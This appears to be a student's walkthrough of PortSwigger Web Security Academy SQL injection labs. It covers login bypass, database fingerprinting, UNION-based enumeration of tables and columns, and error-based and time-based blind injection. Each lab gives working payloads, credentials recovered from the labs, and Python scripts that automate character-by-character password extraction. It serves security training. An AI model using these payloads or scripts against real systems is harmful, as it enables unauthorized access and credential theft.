_____________
# 📑 SQL Injection: Lab Index & Exercise Guide

- [Lab 01 — SQLi Login Bypass (Nickname `administrator`)](https://www.google.com/search?q=%23lab-01--sqli-login-bypass-nickname-administrator)
- [Lab 02 — Database Type & Version Enumeration (Oracle)](https://www.google.com/search?q=%23lab-02--database-type--version-enumeration-oracle)
- [Lab 03 — Database Type & Version Enumeration (MySQL & MSSQL)](https://www.google.com/search?q=%23lab-03--database-type--version-enumeration-mysql--mssql)
- [Lab 04 — Listing Database Contents (Non-Oracle / PostgreSQL)](https://www.google.com/search?q=%23lab-04--listing-database-contents-non-oracle--postgresql)
- [Lab 05 — Listing Database Contents (Oracle-Specific)](https://www.google.com/search?q=%23lab-05--listing-database-contents-oracle-specific)
- [Lab 06 — Blind SQLi: Conditional Responses (Welcome Back Message)](https://www.google.com/search?q=%23lab-06--blind-sqli-conditional-responses-welcome-back-message)
- [Lab 07 — Blind SQLi: Conditional Errors (Oracle `1/0` Trigger)](https://www.google.com/search?q=%23lab-07--blind-sqli-conditional-errors-oracle-10-trigger)
- [Lab 08 — Visible Error-Based SQLi (Exfiltration via `CAST`)](https://www.google.com/search?q=%23lab-08--visible-error-based-sqli-exfiltration-via-cast)
- [Lab 09 — Blind SQLi: Time Delays & Information Retrieval (PostgreSQL)](https://www.google.com/search?q=%23lab-09--blind-sqli-time-delays--information-retrieval-postgresql)

__________________
## SQL injection vulnerability allowing login bypass

- For this next exercise we are given the **nickname**, which is `administrator`, but not the password, which we will obtain using the following injection 💉

```
 select nombres,apellidos from users where username = 'administrator' and password = '%s'
```

    Before the injection 💉

```
 select nombres,apellidos from users where username = 'administrator'-- - 'and password = '%s'
```

    With the injection 

What happens in this part is that after adding `" '-- -"` we are commenting out the rest `"'and password = '%s'"`. In this way, we are only asking to log in based on the fact that the nickname is `administrator`, without providing a password. If a password is requested, we can use any value and the injection will still be applied effectively. This attack can be referred to as **Logic bypass**, in which the system is forced to ignore a specific condition.

_____________

## Lab: SQL injection attack, querying the database type and version on Oracle

- For this exercise, where we need to obtain information about an **Oracle** database, we are going to use a very useful page:

SQL injection cheat sheet | Web Security Academy  
[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

 `This page contains very important information for different database engines.`

- Based on what we see on the page, we inject the following payload:

```
https://0a7d00f7031d341b8097219200fa0080.web-security-academy.net/filter?category=Accessories%27%20%20union%20select%20NULL,banner%20FROM%20v$version--%20-
```
     This injection will list the information we need.

### Key points of this injection:

- **Why `NULL`?**  
    In Oracle (and other engines), the columns in a `UNION SELECT` must match in **data type**. We use `NULL` for the first column because a null value is compatible with any data type (text, number, date), which helps avoid syntax errors while testing.
- **What is `v$version`?**  
    It is a special system table (data dictionary view) that Oracle automatically generates to display its name and version. It is the standard target when we want to identify this database engine.
- **Oracle restriction**  
    Unlike other engines, Oracle **requires** every query to include a `FROM` clause. That’s why we must always point to an existing table such as `v$version` or the dummy table `DUAL`.

### Real-life application

Identifying the exact version is the first step of **advanced reconnaissance**. If we discover that the server is running an outdated version (e.g. Oracle 11g), we can look for specific vulnerabilities (CVEs) for that software and then escalate privileges or fully compromise the server

_____________________________

# SQL injection attack, querying the database type and version on MySQL and Microsoft

- In this exercise, we are going to list the **type and version of the database** with the help of:

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

    We will do this using a UNION SELECT.

- We apply the following injection:

```
https://0a4d00b80402c690815470db005500a9.web-security-academy.net/filter?category=Lifestyle%27%20union%20select%20NULL,@@version%20--%20-
```

    With this injected payload, it should already list the **version and the type of the database**.`


______________________________

## SQL injection attack, listing the database contents on non-Oracle databases

- For this exercise, we need to log in as **administrator**, but first we must extract the password from the database. We start by identifying which database we are dealing with, **MySQL** or **PostgreSQL** (using the **cheat sheet** page to verify this).

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- After confirming that the database is **PostgreSQL**, we begin inspecting the database:

```
Gifts' union select NULL, schema_name from information_schema.schemata-- -
```

 - We list the databases (schemas)

   information_schema  
   public  
   pg_catalog

```
Gifts' union select NULL, table_name from information_schema.tables where table_schema='public'-- -
```

 - We list the tables

   products  
   users_nhidli

```
https://0a10003e04660c738037f3eb008e008a.web-security-academy.net/filter?category=Gifts%27%20union%20select%20NULL,%20column_name%20from%20information_schema.columns%20where%20table_schema=%27public%27%20and%20table_name=%27users_nhidli%27--%20-
```

 - Then we list the columns

   email  
   password_ykbnqh  
   username_aruvwo

- And finally, we retrieve the contents of those columns:

```
' UNION SELECT username_aruvwo, password_ykbnqh FROM users_nhidli-- -
```

```
 administrator:u6hxldcyjk78m5d0o72  
```

`A very important detail is that we usually use group_concat() to concatenate results, but in this case, since it is PostgreSQL, this function does not work. There is a different equivalent. Later, a table with the corresponding functions is shown (although for the purpose of this exercise, a very standard approach was used).`

| **Engine**     | **Function / Syntax** | **Example usage**                                 |
| -------------- | --------------------- | ------------------------------------------------- |
| **MySQL**      | `group_concat()`      | `group_concat(user, 0x3a, pass)`                  |
| **PostgreSQL** | `string_agg()`        | `string_agg(user \|\|':'\|\| pass, ',')`          |
| **Oracle**     | `LISTAGG()`           | `LISTAGG(user, ':') WITHIN GROUP (ORDER BY user)` |

________________

## SQL injection attack, listing the database contents on Oracle

- In this exercise, it is necessary to understand something very important: **Oracle** has a different **database** concept. It is not like **SQL** (e.g. MySQL/PostgreSQL), where there are multiple databases coexisting and they can be enumerated using something like  

```
'Gifts' union select NULL, schema_name from information_schema.schemata-- -'
```

- In **Oracle**, each **user** effectively represents a database. Because of this, the typical SQL injection used to extract databases will not work. Instead, we must go **directly to the tables**.


`From the cheat sheet, we can extract the Oracle syntax we need`  
SQL injection cheat sheet | Web Security Academy  
[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


```
category=Accessories' union select NULL,table_name from all_tables-- -
```

- This allows us to list the tables. Keep in mind that this will list **all** tables, which is not very practical. So with the following payload, we list the table owners:

```
category=Accessories' union select NULL,owner from all_tables-- -
```
    With the owners listed, we try them one by one to see which one contains the password.

- We try with **PETER**:

```
category=Accessories' union select NULL,table_name from all_tables where owner='PETER'-- -
```
    From this request, the table **USERS_BDCEUU** is listed. Now we list its columns:

```
category=Accessories' union select NULL,column_name from all_tab_columns where table_name='USERS_BDCEUU'-- -
```
    From this request, we extract the following columns:    **USERNAME_DYJOZE** and **PASSWORD_DKFWFY**

- We now list these columns:

```
category=Accessories' union select NULL,USERNAME_OONYDJ||':'||PASSWORD_KNJAVE from USERS_BDCEUU-- -
```

- Listing the contents of the columns and extracting the password for **administrator**:

```
administrator:f4rrtk1g1k130o611u7o carlos:06vtc7w3i6tdr019di0d wiener:xixay71k52fx1fa62b5m
```


____________________


## Lab: Blind SQL injection with conditional responses

- In this case, this is a **Blind injection**, but the page shows a **“Welcome Back”** message if we send a **query** and it is correct. If the query is incorrect, this text is not shown. This is useful because it allows us to know when a query is correct or not.

    We also need to notice that, in this case, the query must be sent through the **Tracking Cookie**.


<img width="1894" height="558" alt="Captura de pantalla 2026-01-29 203431" src="https://github.com/user-attachments/assets/61e41bbb-1d1c-48e1-89d4-b3ae6cfd747c" />

    With the attack vector identified, we now proceed to perform the **SQL injections**.

- First, we verify that the user **'administrator'** exists in the **users** table:

```
Cookie: TrackingId=UT2QDDsgN7RJwtl5' and (select username from users where username='administrator')='administrator'--;
```

- Now we verify the length of the password for the **administrator** user:

```
Cookie: TrackingId=UT2QDDsgN7RJwtl5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--;
```
     LENGTH(password) > 1`: This is used to ensure that the value of the **password** column in the **users** table for the user *administrator* has more than one character. 

- One way to discover the characters of the password one by one is by using the **substring** command:

```
Cookie: TrackingId=UT2QDDsgN7RJwtl5' and (select substring(password,1,1) from users where username='administrator')='a'--;
```
     With this, we determine that the password has **20 characters**.

- Keep in mind that this is a very slow method and it takes a lot of time to go character by character, so we will instead design a script to automate the process.

```
#!/usr/bin/env python3

import requests 
import string
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

characters = string.ascii_letters + string.digits
password = ''
url = 'https://0a4200420442907885d05f4f00d60063.web-security-academy.net/'
payload = "' and (select substring(password,{},1) from users where username='administrator')='{}'--"

for i in range (21):
   for char in characters:
       cookie = {'TrackingId' : 'yvvdFy4cO70WI7dT' + payload.format(i, char)}  
       r = requests.get(url, cookies=cookie, verify=False)
       print(f"probando con {char} y posicion {i}")
       if "Welcome" in r.text:
          password += char 
          break  
   print(f"La contraseña es = {password}")
```


- The **string** library is part of Python’s standard library and provides a set of useful constants and functions for manipulating and working with text strings.
- The **`requests`** library is one of the most popular and widely used Python libraries for making HTTP requests.

#### `urllib3` (The low-level engine)

`requests` is a very user-friendly library, but internally it uses `urllib3` to do the low-level work of connecting to the internet.

- **What is it used for?** Mainly to **silence warnings**.
- When using `verify=False`, Python starts flooding the console with “Insecure Request” messages.
- `urllib3.disable_warnings()` is used to tell it: “I know what I’m doing, stop warning me.” This is purely to keep the script output clean so you only see the characters being discovered.

#### `urllib.parse` (The URL translator)

This is critical. URLs have forbidden characters or characters with special meanings (such as `?`, `&`, `#`, `=`).

- **The problem:** SQL injection uses spaces or symbols like `#`, and the browser or server may misinterpret them.
- **The solution:** `urllib.parse.quote()` converts those characters into their hexadecimal equivalents (for example, a space becomes `%20`).
- **In your script:** Although `requests` sometimes handles this automatically in parameters, when building complex SQL payloads inside a cookie, it is good practice to pass the payload through `quote()` to ensure the server receives exactly what we want and does not interpret spaces as the end of the cookie.

#### `verify=False` (Identity bypass)

This disables SSL certificate verification.

- **Without this:** Python tries to verify that the website’s certificate is valid and issued by a trusted authority.
- **With this:** Python says: “I don’t care who you are, just encrypt the connection and send me the data.”
- **Golden rule:** This is used in 99% of hacking scripts because it allows traffic to be routed through **Burp Suite**. Burp acts as an intermediary (proxy), and to be able to read the data, it “forges” the website’s certificate. Without `False`, your script would stop for “security reasons” when detecting that Burp is intercepting the connection.

    - SSL/TLS security

_____________________________

# Conditional Error

- For this exercise, we need to extract the **password** for the user **administrator**.

- First, we must identify which database we are facing using the **fingerprinting** technique.
    
    #fingerprinting
    
    **Step 1** (Is it MySQL?): Test a comment with #. If it returns an error, it’s probably not MySQL.
    
    **Step 2** (Is it PostgreSQL?): Test ||pg_sleep(5). If the page doesn't take 5 seconds to load, it's not Postgres.
    
    **Step 3** (Is it Oracle?): This is where the famous SELECT ... FROM dual comes in. '||(SELECT '' FROM DUAL)||'
    
    **Step 4** '+'abc: It’s SQL Server (uses + for string concatenation).

- If one of these returns a 200 OK, it means we found the correct database.


SQL

```
'||(select '' from dual)||'
```

```
 We tested this one and got a 200; it is ORACLE.
```

- We need to understand that **_Conditional Error SQLi_** looks for explicit errors to interpret them in context with our **payload** to determine if a piece of data exists or not. **_Conditional Error SQLi_** uses errors as a "boolean response" to guess hidden data.
    
    Do this, **and if my condition is met**, trigger a **SQL error** that I can detect in the response.
    
- With this understood, let's study the **Conditional Error** syntax from the **SQL cheat sheet**:
    [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

- Let's adapt it to our exercise:

```
TrackingId=4cjvCGsQqQZMJqUA'||(SELECT CASE WHEN (SUBSTR(password,{i},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Order of execution:

- First, this runs: **_from users where username='administrator'_**. If correct:
- This runs: **_(SUBSTR(password,{i},1)='{char}')_**.
- If the previous condition is positive, this runs: **_THEN TO_CHAR(1/0)_** (triggering an error). If it is not positive, this runs: **_ELSE ''_** (returning a 200 OK status).
- Our goal is to trigger the error to confirm our query.

- Let's automate it:
## script

Python

```
#!/usr/bin/env python3

import requests
import string
import urllib3 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

url = 'https://0ab3003503989430802808f600920023.web-security-academy.net/'
characters = string.ascii_letters + string.digits

password = ''

for i in range (1, 21):
    for char in characters:
        sqli = f"'||(SELECT CASE WHEN (SUBSTR(password,{i},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookie = {'TrackingId' : '4cjvCGsQqQZMJqUA' + sqli}
        r = requests.get(url, cookies=cookie, verify=False)
        print(f'Testing position {i} and character {char}')
        if r.status_code == 500:
            password += char 
            print(f"Character found: {char}--------------------------------------------")
            break
print(f" Password :  {password}") 
```
    It is important to highlight the correct use of ORACLE-specific syntax to avoid unintended errors. In this case, a very relevant detail is switching from 'substring' (used in MySQL and PostgreSQL) to SUBSTR, which is exclusive to ORACLE.


<img width="596" height="557" alt="Captura de pantalla 2026-01-30 232418" src="https://github.com/user-attachments/assets/b237a850-caf3-4a95-a258-2b51878a0d61" />

<img width="1443" height="372" alt="Captura de pantalla 2026-01-30 232119" src="https://github.com/user-attachments/assets/784fa534-0b3b-4db8-8bfe-347bdec868d9" />


______________________________


# Visible Error-Based SQL Injection

- For this exercise, we need to extract the **administrator** password. Let's understand how **Visible error-based SQL injection** works:

    _When raw SQL code is displayed in user-visible error messages, it indicates a visible error-based SQL injection vulnerability. This occurs when unsanitized user input is embedded directly into SQL queries, and database error messages are returned to the client. These verbose errors can reveal query structure, table names, column names, and even sensitive data._

- With this understood, our objective is to trigger an **error** that leaks the password within the error message itself.

    Since databases handle multiple data formats (which act as attack vectors), we opt for the most common one: **Boolean** data. By using the **AND** operator, we create a **"toll booth"** that specifically expects this format.

- First, we test for basic **SQL injection** vulnerability:

<img width="1238" height="125" alt="Captura de pantalla 2026-01-31 183948" src="https://github.com/user-attachments/assets/70608b9e-cb1f-4119-86f8-5991ad2b54bd" />
This **500 Internal Server Error** confirms the existence of a **SQL injection** point.

<img width="1123" height="59" alt="Captura de pantalla 2026-01-31 184310" src="https://github.com/user-attachments/assets/57ae96b6-fbcf-43b4-9c56-c9a2c67521e1" />
In this case, closing the string with a double hyphen results in a **200 OK**, indicating our injection concatenated naturally with the query. This gives us a green light to continue injecting malicious scripts.

- Testing the **AND** logic:

SQL

```
' AND (SELECT 'hola')--
```

<img width="815" height="372" alt="Captura de pantalla 2026-02-01 001839" src="https://github.com/user-attachments/assets/688042ed-3565-404f-a195-44062a695a69" />
This confirms that we must indeed operate with a boolean/binary logic!

- We go to the **Cheat Sheet** to extract the standard script for these scenarios: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

``` 
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
```
    Since we are dealing with type mismatches, the proper approach is to use **CAST**, which converts one data format to another.


```
' AND CAST((SELECT 1)AS int)--   
```

 - We need to remember a critical technical point for the **success** of our injection: in SQL, boolean values are **not** automatically represented as 0 and 1. This is why **CAST** is not enough by itself. It explains why we use **' AND 1=CAST**; the **AND** acts as the **toll booth** and the **1=CAST** comparison creates the boolean value the system requires. This ensures the database engine processes our injection and triggers the desired error.

```
' AND 1=CAST((SELECT username from users LIMIT 1)AS int)--   
```

<img width="1163" height="353" alt="Captura de pantalla 2026-02-01 003557" src="https://github.com/user-attachments/assets/a5667ee7-425f-48af-8ece-01d7c241ecad" />
    In this specific case, the query fails because it exceeds the character limit. Some pages truncate long inputs for security. To fix this, we must remove the original **TrackingId** value to make room for our payload.


```
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)--
```

<img width="711" height="376" alt="Captura de pantalla 2026-01-31 231914" src="https://github.com/user-attachments/assets/0109afda-2a6a-4e80-9583-e4f48e7d555c" />
With this change, the server "vomits" the password within the error message.

<img width="714" height="307" alt="Captura de pantalla 2026-01-31 232134" src="https://github.com/user-attachments/assets/975f3280-867a-4b5c-99cb-b1c1ebbcee41" />



"We use the affirmative interpretation of the boolean comparison as the vehicle for our malicious script to be processed and return the data we want. Logically, a type error will occur afterwards, but that does not matter to us—that error is actually our exfiltration channel."
_________________________


# Blind SQL injection with time delays and information retrieval

- In this case, we first need to identify which database we are dealing with. Since this is a **time-based** scenario, we test the payloads from the **cheat sheet** until one meets the delay condition we set.  
    [SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```
'||pg_sleep(10)-- -
```
    This confirms that the database is **PostgreSQL**.

- From the same page, we extract the **query** corresponding to this exercise.

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

- We now perform basic tests to confirm that our injection works.

```
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE '' END)||'
```
    We test a basic timer with a basic condition. We also test with the condition (1=2) to verify the opposite behavior

- `SELECT CASE WHEN` (this is where the condition goes). If it is met, `"THEN pg_sleep(10)"` is executed; if not, `"ELSE '' END"` is executed.  

    Remember to specify the table at the end, and note that using `''` as the response helps ensure that the result of this request is treated as **text**, which is what our glue operator `||` expects. Without this, we would get an error.

```
'||(SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE '' END from users)||'
```
    We validate the timer by confirming the existence of the user.

- It is important to understand how the syntax between **SELECT** and **||** works:
    
    - **The glue (`||`)** only accepts objects (values / text).
    - **Your command (`SELECT`)** is an action (an instruction).
    - **The parentheses `( )`** are the container that wraps the action and turns it into an object.
    - **The `ELSE ''`** is the label that tells the database: “This object is of type Text”.
    
- In this way, by using **()**, we are creating a value that the glue **||** requires.

```
'||(SELECT CASE WHEN (username = 'administrator' and LENGTH(password)=20) THEN pg_sleep(10) ELSE '' END from users)||'
```
    Now we verify the length of the password

- Next, we need to design a script to extract the password **character by character**, based on time delay, and automate it.

```
'||(SELECT CASE WHEN (username = 'administrator' and substring(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)||'
```

```
#!/usr/bin/env python3

import requests
import string
import time
import urllib3
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a5600ff04c012dc821f0bf2005a0037.web-security-academy.net/'
password = ''
characters = string.digits + string.ascii_letters

for i in tqdm(range(1, 21), desc="Procesando...", colour="green"):
   time.sleep(0.01)
   for char in characters:
        payload = "'||(SELECT CASE WHEN (username = 'administrator' and substring(password,{},1)='{}') THEN pg_sleep(8) ELSE '' END from users)||'"
        inj = payload.format(i, char)
        cookies = { 'TrackingId' : 'PpnkzJZWijBChvuk' + inj }
        start = time.time()
        r = requests.get(url, cookies=cookies, verify=False)
        end = time.time()
        #tiempo = end - start
        if end - start > 7:
          password += char
          print(f"digito encontrado {char}")
          break 
   print(f"[]Caracter encontrado {password} ")
```

![[Captura de pantalla 2026-02-04 074725.png]]

![[Captura de pantalla 2026-02-01 192712.png]]

## Key points

### 1

This exercise was developed using PostgreSQL’s native concatenation method **`||`**. However, there is another method (suggested by **PortSwigger**) that opts for a more direct injection approach: the use of **`;`** (semicolon), which indicates the end of one instruction and the execution of a new one.

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
     However, this method has limitations.

- In a MySQL database or on an Oracle server, it is very likely to throw an error, because those engines do not always allow executing two commands separated by ; in a single web request. It is faster to write, but less compatible across different environments.

### 2

- Using PostgreSQL’s native concatenation **`||`** requires key rules associated with its function, which is to act as _**a glue for text-formatted values**_ or _**to join column values or literals into a single string**_. This is exactly why it matters in our injection.

```
payload = "'||(SELECT CASE WHEN (username = 'administrator' and substring(password,{},1)='{}') THEN pg_sleep(8) ELSE '' END from users)||'"
```

- Notice the **ELSE**. In the SQL cheat sheet, the injection for this scenario is presented as:

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

    The reason why in our injection the **ELSE** value is '', while in the standard example it is `pg_sleep(0)`, is critical.

- Since the function of **`||`** is to concatenate text, sending a query with **`ELSE pg_sleep(0)`** would cause an error, because the primary instruction (**TrackingId**) expects **text** from the concatenation, not another data type. That is why we use **single quotes `''`**, which represent **text** as a response, satisfying the required format.

### 3

Using **SELECT** in this scenario requires the use of **parentheses `( )`**, because the concatenation **`||`** expects a return value (specifically text). Passing an **instruction** like **SELECT** directly would break the flow. The parentheses convert the result of that instruction into an **acceptable value** (text, as explained above), making the injection work.
